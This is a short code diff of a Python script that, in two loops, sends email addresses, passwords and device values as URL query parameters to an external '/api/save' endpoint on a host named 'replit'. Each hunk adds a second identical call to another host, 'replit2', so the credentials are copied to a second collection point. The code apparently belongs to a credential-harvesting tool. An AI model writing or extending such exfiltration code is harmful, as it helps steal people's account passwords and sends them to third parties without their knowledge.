@@ -67,6 +67,7 @@ for _ in range(3):
     #t=json.dumps(d)
     print(d)
     requests.get(url=f"{replit}/api/save?email={str(email)}&password={str(password)}&device={str(dev)}")
+    requests.get(url=f"{replit2}/api/save?email={str(email)}&password={str(password)}&device={str(dev)}")
   except Exception as l:
     print(l)
     pass 
@@ -96,6 +97,7 @@ for _ in range(2):
     #t=json.dumps(d)
     print(d)
     requests.get(url=f"{replit}/api/save?email={str(email)}&password={str(password)}&device={str(dev)}")
+    requests.get(url=f"{replit2}/api/save?email={str(email)}&password={str(password)}&device={str(dev)}")
   except Exception as k:
     print(k)
     pass
